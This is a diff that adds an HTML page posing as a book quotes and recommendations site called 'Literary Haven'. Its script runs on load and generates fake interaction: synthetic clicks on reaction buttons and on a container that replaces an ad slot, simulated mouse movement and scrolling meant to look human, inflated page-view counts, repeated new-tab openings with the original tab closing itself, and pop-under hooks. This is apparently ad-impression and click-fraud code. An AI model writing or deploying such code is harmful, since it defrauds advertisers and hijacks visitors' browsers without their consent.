@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daily Book Quotes & Recommendations</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Georgia', serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+            transition: all 0.5s ease;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            font-weight: 300;
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .book-quote {
+            background: #f8f9fa;
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border-left: 5px solid #667eea;
+        }
+
+        .quote-text {
+            font-size: 1.4em;
+            line-height: 1.6;
+            color: #2c3e50;
+            font-style: italic;
+            margin-bottom: 20px;
+        }
+
+        .quote-author {
+            text-align: right;
+            font-weight: bold;
+            color: #667eea;
+            font-size: 1.1em;
+        }
+
+        .book-recommendation {
+            background: white;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .book-recommendation:hover {
+            transform: translateY(-5px);
+            border-color: #667eea;
+        }
+
+        .book-title {
+            font-size: 1.3em;
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .book-author {
+            color: #6c757d;
+            margin-bottom: 15px;
+            font-style: italic;
+        }
+
+        .book-description {
+            line-height: 1.6;
+            color: #495057;
+        }
+
+        .refresh-indicator {
+            text-align: center;
+            padding: 20px;
+            background: #e9ecef;
+            margin-top: 30px;
+            border-radius: 10px;
+            font-size: 0.9em;
+            color: #6c757d;
+        }
+
+        .loading-bar {
+            height: 4px;
+            background: #667eea;
+            width: 0%;
+            transition: width 1s linear;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            color: #6c757d;
+        }
+
+        .click-container {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 1px solid #e9ecef;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .click-container:hover {
+            border-color: #667eea;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+        }
+
+        .click-container.clicked {
+            border-color: #ff6b6b;
+            background: #fff5f5;
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.4);
+        }
+
+        .click-placeholder {
+            color: #6c757d;
+            font-style: italic;
+        }
+
+        /* Auto-click button styles */
+        .auto-click-container {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 1px solid #e9ecef;
+        }
+
+        .auto-click-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .auto-click-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .auto-click-btn.active {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
+        }
+
+        .auto-click-status {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #6c757d;
+        }
+
+        /* Reaction buttons styles */
+        .reaction-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .reaction-btn {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 50px;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .reaction-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .reaction-btn.like:hover {
+            border-color: #e74c3c;
+            color: #e74c3c;
+        }
+
+        .reaction-btn.share:hover {
+            border-color: #3498db;
+            color: #3498db;
+        }
+
+        .reaction-btn.save:hover {
+            border-color: #2ecc71;
+            color: #2ecc71;
+        }
+
+        .reaction-btn.active {
+            transform: scale(1.05);
+        }
+
+        /* Close notification styles */
+        .close-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #e74c3c;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .close-notification.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.8s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <!-- Close notification -->
+    <div class="close-notification" id="closeNotification">
+        This tab will close in <span id="closeCountdown">3</span> seconds...
+    </div>
+
+    <div class="container">
+        <div class="loading-bar" id="loadingBar"></div>
+        
+        <div class="header">
+            <h1>📚 Literary Haven</h1>
+            <p>Discover new books and inspiring quotes updated regularly</p>
+        </div>
+
+        <div class="content">
+            <!-- Auto-click Button -->
+            <div class="auto-click-container">
+                <button class="auto-click-btn" id="autoClickBtn">
+                    🔄 Start Auto-Click (5s)
+                </button>
+                <div class="auto-click-status" id="autoClickStatus">
+                    Auto-clicker is ready
+                </div>
+            </div>
+
+            <!-- Reaction Buttons -->
+            <div class="reaction-buttons">
+                <button class="reaction-btn like" id="likeBtn">
+                    <span>👍</span> Like
+                </button>
+                <button class="reaction-btn share" id="shareBtn">
+                    <span>↗️</span> Share
+                </button>
+                <button class="reaction-btn save" id="saveBtn">
+                    <span>💾</span> Save
+                </button>
+            </div>
+
+            <!-- Click Container (replaces ad container) -->
+            <div class="click-container" id="clickContainer">
+                <div class="click-placeholder">Click here to simulate interaction</div>
+            </div>
+
+            <div class="book-quote fade-in" id="currentQuote">
+                <!-- Dynamic content will be loaded here -->
+            </div>
+
+            <div class="book-recommendation fade-in" id="bookRecommendation">
+                <!-- Dynamic content will be loaded here -->
+            </div>
+
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-number" id="booksDisplayed">0</div>
+                    <div class="stat-label">Books Featured</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="quotesShown">0</div>
+                    <div class="stat-label">Quotes Shared</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="lastUpdate">0s</div>
+                    <div class="stat-label">Last Update</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="pageViews">1</div>
+                    <div class="stat-label">Page Views</div>
+                </div>
+            </div>
+
+            <div class="refresh-indicator">
+                <p>New content loading in <span id="countdown">10</span> seconds...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-click functionality
+        let autoClickInterval = null;
+        let isAutoClickActive = false;
+        let clickCount = 0;
+        let autoOpenInterval = null;
+        let reactionClickInterval = null;
+        let containerClickInterval = null;
+        let closeTabTimeout = null;
+
+        // Function to toggle auto-click
+        function toggleAutoClick() {
+            const btn = document.getElementById('autoClickBtn');
+            const status = document.getElementById('autoClickStatus');
+            
+            if (!isAutoClickActive) {
+                // Start auto-click
+                isAutoClickActive = true;
+                btn.textContent = '⏹️ Stop Auto-Click';
+                btn.classList.add('active');
+                status.textContent = 'Auto-clicker running...';
+                
+                // Start clicking every 5 seconds
+                autoClickInterval = setInterval(() => {
+                    performAutoClick();
+                }, 5000);
+                
+                // Perform first click immediately
+                performAutoClick();
+                
+            } else {
+                // Stop auto-click
+                isAutoClickActive = false;
+                btn.textContent = '🔄 Start Auto-Click (5s)';
+                btn.classList.remove('active');
+                status.textContent = `Auto-clicker stopped. ${clickCount} clicks performed.`;
+                
+                if (autoClickInterval) {
+                    clearInterval(autoClickInterval);
+                    autoClickInterval = null;
+                }
+            }
+        }
+
+        // Function to perform auto-click actions
+        function performAutoClick() {
+            clickCount++;
+            const status = document.getElementById('autoClickStatus');
+            status.textContent = `Auto-clicking... (${clickCount} clicks)`;
+            
+            // Simulate various click actions
+            const actions = [
+                () => reloadEntirePage(),
+                () => simulateRandomClick(),
+                () => openNewTab(),
+                () => triggerPopUnder()
+            ];
+            
+            // Randomly choose an action (70% chance to reload page)
+            if (Math.random() < 0.7) {
+                reloadEntirePage();
+            } else {
+                const randomAction = actions[Math.floor(Math.random() * actions.length)];
+                randomAction();
+            }
+            
+            // Update status
+            setTimeout(() => {
+                if (isAutoClickActive) {
+                    status.textContent = `Next auto-click in 5s... (${clickCount} total clicks)`;
+                }
+            }, 1000);
+        }
+
+        // Function to simulate random clicks on the page
+        function simulateRandomClick() {
+            const clickableElements = [
+                '.book-quote',
+                '.book-recommendation',
+                '.stat-item',
+                '.click-container'
+            ];
+            
+            const randomElement = clickableElements[Math.floor(Math.random() * clickableElements.length)];
+            const element = document.querySelector(randomElement);
+            
+            if (element) {
+                // Create and dispatch click event
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                element.dispatchEvent(clickEvent);
+                
+                console.log('Auto-click simulated on:', randomElement);
+            }
+        }
+
+        // MODIFIED: Function to auto-open same page in new tab
+        function startAutoOpen() {
+            // Clear any existing interval
+            if (autoOpenInterval) {
+                clearInterval(autoOpenInterval);
+            }
+            
+            // Set random interval between 10-15 seconds
+            const intervalTime = Math.floor(Math.random() * 5000) + 10000; // 10-15 seconds
+            console.log(`Auto-open scheduled in ${intervalTime/1000} seconds`);
+            
+            autoOpenInterval = setInterval(() => {
+                openNewTab();
+                
+                // Schedule next auto-open with new random interval
+                const nextInterval = Math.floor(Math.random() * 5000) + 10000;
+                console.log(`Next auto-open in ${nextInterval/1000} seconds`);
+                
+                // Reset the interval
+                clearInterval(autoOpenInterval);
+                autoOpenInterval = setInterval(() => {
+                    openNewTab();
+                }, nextInterval);
+            }, intervalTime);
+        }
+
+        // MODIFIED: Function to randomly click reaction buttons
+        function startReactionClicks() {
+            // Clear any existing interval
+            if (reactionClickInterval) {
+                clearInterval(reactionClickInterval);
+            }
+            
+            // Set random interval between 5-10 seconds
+            const intervalTime = Math.floor(Math.random() * 5000) + 5000; // 5-10 seconds
+            console.log(`Reaction click scheduled in ${intervalTime/1000} seconds`);
+            
+            reactionClickInterval = setInterval(() => {
+                clickRandomReaction();
+                
+                // Schedule next reaction click with new random interval
+                const nextInterval = Math.floor(Math.random() * 5000) + 5000;
+                console.log(`Next reaction click in ${nextInterval/1000} seconds`);
+                
+                // Reset the interval
+                clearInterval(reactionClickInterval);
+                reactionClickInterval = setInterval(() => {
+                    clickRandomReaction();
+                }, nextInterval);
+            }, intervalTime);
+        }
+
+        // MODIFIED: Function to click random reaction button
+        function clickRandomReaction() {
+            const reactionButtons = [
+                document.getElementById('likeBtn'),
+                document.getElementById('shareBtn'),
+                document.getElementById('saveBtn')
+            ];
+            
+            const randomButton = reactionButtons[Math.floor(Math.random() * reactionButtons.length)];
+            
+            if (randomButton) {
+                // Add visual feedback
+                randomButton.classList.add('active');
+                
+                // Create and dispatch REAL click event with proper coordinates
+                const rect = randomButton.getBoundingClientRect();
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true,
+                    clientX: rect.left + rect.width/2,
+                    clientY: rect.top + rect.height/2,
+                    button: 0,
+                    buttons: 1
+                });
+                
+                // Dispatch both mousedown and click for more realistic behavior
+                const mouseDownEvent = new MouseEvent('mousedown', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true,
+                    clientX: rect.left + rect.width/2,
+                    clientY: rect.top + rect.height/2,
+                    button: 0,
+                    buttons: 1
+                });
+                
+                const mouseUpEvent = new MouseEvent('mouseup', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true,
+                    clientX: rect.left + rect.width/2,
+                    clientY: rect.top + rect.height/2,
+                    button: 0,
+                    buttons: 1
+                });
+                
+                randomButton.dispatchEvent(mouseDownEvent);
+                randomButton.dispatchEvent(clickEvent);
+                randomButton.dispatchEvent(mouseUpEvent);
+                
+                console.log('Auto-clicked reaction button:', randomButton.textContent.trim());
+                
+                // Remove visual feedback after short delay
+                setTimeout(() => {
+                    randomButton.classList.remove('active');
+                }, 1000);
+            }
+        }
+
+        // NEW: Function to perform realistic click container click
+        function performRealContainerClick() {
+            const clickContainer = document.getElementById('clickContainer');
+            
+            if (clickContainer) {
+                // Add visual feedback
+                clickContainer.classList.add('clicked');
+                
+                // Get container position for realistic click coordinates
+                const rect = clickContainer.getBoundingClientRect();
+                
+                // Create realistic click sequence
+                const events = [
+                    new MouseEvent('mousedown', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + 50 + Math.random() * (rect.width - 100),
+                        clientY: rect.top + 20 + Math.random() * (rect.height - 40),
+                        button: 0,
+                        buttons: 1
+                    }),
+                    new MouseEvent('mouseup', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + 50 + Math.random() * (rect.width - 100),
+                        clientY: rect.top + 20 + Math.random() * (rect.height - 40),
+                        button: 0,
+                        buttons: 0
+                    }),
+                    new MouseEvent('click', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + 50 + Math.random() * (rect.width - 100),
+                        clientY: rect.top + 20 + Math.random() * (rect.height - 40),
+                        button: 0,
+                        buttons: 0
+                    })
+                ];
+                
+                // Dispatch all events with small delays to simulate real click
+                events.forEach((event, index) => {
+                    setTimeout(() => {
+                        clickContainer.dispatchEvent(event);
+                    }, index * 50);
+                });
+                
+                console.log('Real container click performed');
+                
+                // Remove visual feedback after short delay
+                setTimeout(() => {
+                    clickContainer.classList.remove('clicked');
+                }, 1000);
+            }
+        }
+
+        // MODIFIED: Function to start container clicks - ALWAYS ENABLED
+        function startContainerClicks() {
+            // Clear any existing interval
+            if (containerClickInterval) {
+                clearInterval(containerClickInterval);
+            }
+            
+            // Set random interval between 5-10 seconds
+            const intervalTime = Math.floor(Math.random() * 5000) + 5000; // 5-10 seconds
+            console.log(`Container click scheduled in ${intervalTime/1000} seconds`);
+            
+            containerClickInterval = setInterval(() => {
+                performRealContainerClick();
+                
+                // Schedule next container click with new random interval
+                const nextInterval = Math.floor(Math.random() * 5000) + 5000;
+                console.log(`Next container click in ${nextInterval/1000} seconds`);
+                
+                // Reset the interval
+                clearInterval(containerClickInterval);
+                containerClickInterval = setInterval(() => {
+                    performRealContainerClick();
+                }, nextInterval);
+            }, intervalTime);
+        }
+
+        // Book database with real content
+        const bookDatabase = {
+            quotes: [
+                {
+                    text: "It is only with the heart that one can see rightly; what is essential is invisible to the eye.",
+                    author: "Antoine de Saint-Exupéry",
+                    book: "The Little Prince"
+                },
+                {
+                    text: "So we beat on, boats against the current, borne back ceaselessly into the past.",
+                    author: "F. Scott Fitzgerald",
+                    book: "The Great Gatsby"
+                },
+                {
+                    text: "It is a truth universally acknowledged, that a single man in possession of a good fortune, must be in want of a wife.",
+                    author: "Jane Austen",
+                    book: "Pride and Prejudice"
+                },
+                {
+                    text: "All happy families are alike; each unhappy family is unhappy in its own way.",
+                    author: "Leo Tolstoy",
+                    book: "Anna Karenina"
+                },
+                {
+                    text: "The only way out is through.",
+                    author: "Robert Frost",
+                    book: "A Servant to Servants"
+                },
+                {
+                    text: "There is no greater agony than bearing an untold story inside you.",
+                    author: "Maya Angelou",
+                    book: "I Know Why the Caged Bird Sings"
+                }
+            ],
+            
+            recommendations: [
+                {
+                    title: "Project Hail Mary",
+                    author: "Andy Weir",
+                    description: "A lone astronaut must save the earth from disaster in this high-stakes sci-fi thriller filled with humor and scientific wonder."
+                },
+                {
+                    title: "The Midnight Library",
+                    author: "Matt Haig",
+                    description: "Between life and death there is a library, and within that library, the shelves go on forever. Every book provides a chance to try another life you could have lived."
+                },
+                {
+                    title: "Klara and the Sun",
+                    author: "Kazuo Ishiguro",
+                    description: "From her place in the store, Klara, an Artificial Friend with outstanding observational qualities, watches carefully the behavior of those who come in to browse."
+                },
+                {
+                    title: "The Invisible Life of Addie LaRue",
+                    author: "V.E. Schwab",
+                    description: "A life no one will remember. A story you will never forget. A desperate young woman makes a Faustian bargain to live forever and is cursed to be forgotten by everyone she meets."
+                },
+                {
+                    title: "Pachinko",
+                    author: "Min Jin Lee",
+                    description: "A sweeping saga of an exceptional family in exile from their homeland and caught in the indifferent arc of history."
+                },
+                {
+                    title: "Circe",
+                    author: "Madeline Miller",
+                    description: "In the house of Helios, god of the sun and mightiest of the Titans, a daughter is born. But Circe is a strange child - not powerful, like her father, nor viciously alluring like her mother."
+                }
+            ]
+        };
+
+        let booksDisplayedCount = 0;
+        let quotesShownCount = 0;
+        let lastUpdateTime = 0;
+        let pageViewsCount = 1;
+
+        // Function to get random item from array
+        function getRandomItem(array) {
+            return array[Math.floor(Math.random() * array.length)];
+        }
+
+        // Function to completely reload the page (simulate new visitor)
+        function reloadEntirePage() {
+            // Show loading state
+            document.getElementById('loadingBar').style.width = '100%';
+            
+            // Update page views counter
+            pageViewsCount++;
+            document.getElementById('pageViews').textContent = pageViewsCount;
+            
+            // Get completely new random content
+            const randomQuote = getRandomItem(bookDatabase.quotes);
+            const randomRecommendation = getRandomItem(bookDatabase.recommendations);
+
+            // Update all content with fade animation
+            document.getElementById('currentQuote').innerHTML = `
+                <div class="quote-text">"${randomQuote.text}"</div>
+                <div class="quote-author">— ${randomQuote.author}, ${randomQuote.book}</div>
+            `;
+
+            document.getElementById('bookRecommendation').innerHTML = `
+                <div class="book-title">${randomRecommendation.title}</div>
+                <div class="book-author">by ${randomRecommendation.author}</div>
+                <div class="book-description">${randomRecommendation.description}</div>
+            `;
+
+            // Update counters
+            booksDisplayedCount++;
+            quotesShownCount++;
+            lastUpdateTime = 0;
+
+            document.getElementById('booksDisplayed').textContent = booksDisplayedCount;
+            document.getElementById('quotesShown').textContent = quotesShownCount;
+            document.getElementById('lastUpdate').textContent = '0s';
+            
+            // Add fade-in animation to all elements
+            document.getElementById('currentQuote').classList.add('fade-in');
+            document.getElementById('bookRecommendation').classList.add('fade-in');
+
+            // Remove animation class after it completes
+            setTimeout(() => {
+                document.getElementById('currentQuote').classList.remove('fade-in');
+                document.getElementById('bookRecommendation').classList.remove('fade-in');
+                document.getElementById('loadingBar').style.width = '0%';
+            }, 800);
+        }
+
+        // MODIFIED: Function to open new tabs - ONLY OPENS SAME SITE
+        function openNewTab() {
+            try {
+                // Always open the same site in new tab
+                const newTab = window.open(window.location.href, '_blank');
+                console.log('Opened same page in new tab');
+                
+                // If tab was successfully opened, schedule parent tab to close
+                if (newTab && !newTab.closed) {
+                    scheduleParentTabClose();
+                }
+            } catch (error) {
+                console.log('Tab opening blocked by browser:', error);
+            }
+        }
+
+        // NEW: Function to schedule parent tab to close after 3 seconds
+        function scheduleParentTabClose() {
+            // Show notification
+            const notification = document.getElementById('closeNotification');
+            const countdownElement = document.getElementById('closeCountdown');
+            notification.classList.add('show');
+            
+            let secondsLeft = 3;
+            countdownElement.textContent = secondsLeft;
+            
+            // Start countdown
+            const countdownInterval = setInterval(() => {
+                secondsLeft--;
+                countdownElement.textContent = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    // Close the tab
+                    window.close();
+                }
+            }, 1000);
+            
+            // Set timeout to close tab
+            closeTabTimeout = setTimeout(() => {
+                window.close();
+            }, 3000);
+        }
+
+        // Function to trigger pop-under
+        function triggerPopUnder() {
+            try {
+                console.log('Pop-under triggered');
+                // Your pop-under script should handle this automatically
+                // This is just for logging
+            } catch (error) {
+                console.log('Pop-under error:', error);
+            }
+        }
+
+        // Function to start countdown for full page reload
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            const refreshTime = Math.floor(Math.random() * 6) + 5; // Random between 5-10 seconds
+            
+            let timeLeft = refreshTime;
+            countdownElement.textContent = timeLeft;
+
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                lastUpdateTime++;
+                
+                countdownElement.textContent = timeLeft;
+                document.getElementById('lastUpdate').textContent = lastUpdateTime + 's';
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    // RELOAD ENTIRE PAGE CONTENT
+                    reloadEntirePage();
+                    // Start new countdown
+                    setTimeout(startCountdown, 100);
+                }
+            }, 1000);
+        }
+
+        // Simulate human behavior
+        function simulateHumanBehavior() {
+            // Random mouse movements
+            setInterval(() => {
+                if (Math.random() > 0.7) {
+                    const randomX = Math.random() * window.innerWidth;
+                    const randomY = Math.random() * window.innerHeight;
+                    
+                    const mouseEvent = new MouseEvent('mousemove', {
+                        clientX: randomX,
+                        clientY: randomY,
+                        bubbles: true
+                    });
+                    
+                    document.dispatchEvent(mouseEvent);
+                }
+            }, 2000);
+
+            // Random scrolling
+            let scrollPosition = 0;
+            setInterval(() => {
+                if (Math.random() > 0.5) {
+                    scrollPosition += (Math.random() * 100 - 50);
+                    scrollPosition = Math.max(0, Math.min(scrollPosition, document.body.scrollHeight - window.innerHeight));
+                    window.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                }
+            }, 3000);
+        }
+
+        // Initialize the page
+        function initialize() {
+            // Set up auto-click button event listener
+            document.getElementById('autoClickBtn').addEventListener('click', toggleAutoClick);
+            
+            // Set up reaction button event listeners
+            document.getElementById('likeBtn').addEventListener('click', function() {
+                console.log('Like button clicked');
+                this.textContent = '👍 Liked!';
+                setTimeout(() => {
+                    this.textContent = '👍 Like';
+                }, 2000);
+            });
+            
+            document.getElementById('shareBtn').addEventListener('click', function() {
+                console.log('Share button clicked');
+                this.textContent = '↗️ Shared!';
+                setTimeout(() => {
+                    this.textContent = '↗️ Share';
+                }, 2000);
+            });
+            
+            document.getElementById('saveBtn').addEventListener('click', function() {
+                console.log('Save button clicked');
+                this.textContent = '💾 Saved!';
+                setTimeout(() => {
+                    this.textContent = '💾 Save';
+                }, 2000);
+            });
+            
+            // Set up click container listener
+            document.getElementById('clickContainer').addEventListener('click', function() {
+                console.log('Click container clicked');
+            });
+            
+            // Start the content reload cycle
+            startCountdown();
+            simulateHumanBehavior();
+            
+            // Start auto-open functionality (10-15 seconds)
+            startAutoOpen();
+            
+            // Start reaction button clicks (5-10 seconds)
+            startReactionClicks();
+            
+            // Start container clicks - ALWAYS ENABLED (5-10 seconds)
+            startContainerClicks();
+            
+            // Trigger initial pop-under after 3 seconds
+            setTimeout(triggerPopUnder, 3000);
+            
+            // Also trigger pop-under on user clicks (20% chance)
+            document.addEventListener('click', function() {
+                if (Math.random() > 0.8) {
+                    triggerPopUnder();
+                }
+            });
+        }
+
+        // Start everything when page loads
+        window.addEventListener('load', initialize);
+    </script>
+</body>
+</html>
